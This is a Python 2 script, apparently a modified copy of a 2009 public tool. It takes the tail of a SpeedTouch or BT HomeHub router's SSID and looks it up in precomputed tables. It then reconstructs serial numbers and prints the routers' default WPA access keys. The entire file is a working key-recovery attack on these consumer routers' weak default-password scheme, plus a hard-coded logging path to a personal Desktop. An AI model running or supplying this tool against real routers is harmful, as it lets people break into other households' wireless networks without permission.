#!/usr/bin/python2
# touchspeedcalc_test.py (2009/10/09)
# Example for demonstrating use of SpeedTouch wireless router default password lookup tables
#
# 	http://www.mentalpitstop.com/touchspeedcalc
#
# Distributed under the Creative Commons Attribution Non-commercial Share-Alike license,
# http://creativecommons.org/licenses/by-nc-sa/3.0/us/
# Contact me at mentalpitstop.com for more information and licensing info.
#
# Make sure the correct modules (like hashlib) are installed in your python version, as I've noticed some python versions (2.4 vs 2.6) handle this differently
# Created and tested with Python 2.6
# Note that the data files must be located in the /data/ subdirectory for this script to find them.
#
# Usage:
# 	python2.6 touchspeedcalc_test.py [SSID]
# Where [SSID] are the last 6 characters of the SSID.
#
# Edit the 'YEARS' variable if you want to include 2010 (not tested)

import hashlib
import sys
import binascii
import re

class MyWriter:

    def __init__(self, stdout, filename):
        self.stdout = stdout
        self.logfile = file(filename, 'w')

    def write(self, text):
        self.stdout.write(text)
        self.logfile.write(text)

    def close(self):
        self.stdout.close()
        self.logfile.close()

writer = MyWriter(sys.stdout, '/home/frost/Desktop/' + sys.argv[1] + '.txt')
sys.stdout = writer


if len(sys.argv) > 1:
    SSIDEND = sys.argv[1].upper()
else:
    SSIDEND = raw_input("==> ").upper()
#sys.argv[1].decode("hex")


if len(SSIDEND) == 6:
  #SpeedTouch:
  FINDPOS = 0
elif len(SSIDEND) == 4:
  #BT HomeHub:
  FINDPOS = 1
else:
  print "SSID-end must be either 6 or 4 characters."
  sys.exit()

YEARS = [2004, 2005, 2006, 2007, 2008, 2009, 2010, 2011, 2012, 2013, 2014, 2015, 2016, 2017, 2018, 2019, 2020, 2021, 2022, 2023, 2024, 2025, 2026, 2027, 2028, 2029, 2030, 2031, 2032, 2033, 2034, 2035, 2036, 2037, 2038, 2039, 2040, 2041, 2042, 2043, 2044, 2045, 2046, 2047, 2048, 2049, 2050, 2051, 2052, 2053, 2054, 2055, 2056, 2057, 2058, 2059, 2060, 2061, 2062, 2063, 2064, 2065, 2066, 2067, 2068, 2069, 2070, 2071, 2072, 2073, 2074, 2075, 2076, 2077, 2078, 2079, 2080, 2081, 2082, 2083, 2084, 2085, 2086, 2087, 2088, 2089, 2090, 2091, 2092, 2093, 2094, 2095, 2096, 2097, 2098, 2099, 2100]
#YEARS = [ 2009, 2008, 2007, 2006, 2005, 2004, 2010 ]
#YEAR = sys.argv[2].lower()

def ascii2hex(char):
  return hex(ord(char))[2:].upper()

CHARSET = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
BINCODE = binascii.unhexlify("".join(SSIDEND.split()))
#print "Compressed SSID: ", BINCODE


for YEAR in YEARS:
  FILE = "db/db_with_keys___" + str(YEAR) + ".dat"
  INFILE = open(FILE,"rb")
  FILEDATA = INFILE.read()
  INFILE.close()
  WHEREFOUND = FILEDATA.find(BINCODE, 0)
  while (WHEREFOUND > -1):
    if WHEREFOUND % 3 == FINDPOS:
      PRODIDNUM = (WHEREFOUND / 3) % (36*36*36)
      PRODWEEK = (WHEREFOUND / 3) / (36*36*36) +1
      PRODID1 = PRODIDNUM / (36*36)
      PRODID2 = (PRODIDNUM / 36) % 36
      PRODID3 = PRODIDNUM % 36
      SERIAL = 'CP%02d%02d%s%s%s' % (YEAR-2000,PRODWEEK,ascii2hex(CHARSET[PRODID1:PRODID1+1]),ascii2hex(CHARSET[PRODID2:PRODID2+1]),ascii2hex(CHARSET[PRODID3:PRODID3+1]))
      SHA1SUM = hashlib.sha1(SERIAL).digest().encode("hex").upper()
      SSID = SHA1SUM[-6:]
      ACCESSKEY = SHA1SUM[0:10]
      if len(SSIDEND) == 4:
        # BT HomeHub password is lowercase:
        ACCESSKEY = ACCESSKEY.lower()
      #print "Serial number:", str(SERIAL)  # does not give proper serial number for the thompsons BT series
      #print "SHA1SUM:", str(SHA1SUM)
      print str(ACCESSKEY)

    WHEREFOUND = FILEDATA.find(BINCODE, WHEREFOUND+1)